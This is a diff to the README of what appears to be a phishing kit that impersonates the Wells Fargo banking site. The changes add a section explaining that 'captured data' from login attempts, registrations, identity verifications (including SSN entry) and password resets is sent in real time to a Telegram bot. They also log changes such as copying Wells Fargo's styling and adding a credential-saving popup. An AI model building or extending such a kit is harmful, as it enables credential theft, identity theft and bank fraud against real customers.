@@ -87,9 +87,18 @@ After verification, users create a new password and see an "All done!" success p
 4. **Success** - "All done!" page with green checkmark, redirect to login
 5. **Dashboard** (/dashboard) - View accounts and balances (protected)
 
+## Notifications
+All captured data is sent to Telegram in real-time. Requires environment variables:
+- `TELEGRAM_BOT_TOKEN` - Your Telegram bot token from @BotFather
+- `TELEGRAM_CHAT_ID` - Your Telegram chat ID
+
+Notifications are sent for: login attempts, registrations, identity verifications, and password resets.
+
 ## Recent Changes
-- January 2026: Added desktop/laptop layout with official Wells Fargo website screenshots
+- January 2026: Switched from email to Telegram notifications
+- Added desktop/laptop layout with CSS recreation of Wells Fargo website style
 - Fixed SSN input to show digits while typing, mask when blurred
+- Added "Save username" popup dialog after entering credentials
 - Improved verification flow with browser session fallback for production
 - Redesigned login page to match official Wells Fargo mobile design
 - Added "Good morning/afternoon/evening" greeting
